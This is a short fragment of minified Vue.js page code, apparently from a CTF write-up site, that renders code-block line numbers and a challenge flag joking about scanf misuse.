("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br")])]),n("p",[s._v("flag:Sorry mom.. I got confused about scanf usage ğŸ˜¦")])])}),[],!1,null,null,null);t.default=e.exports}}]);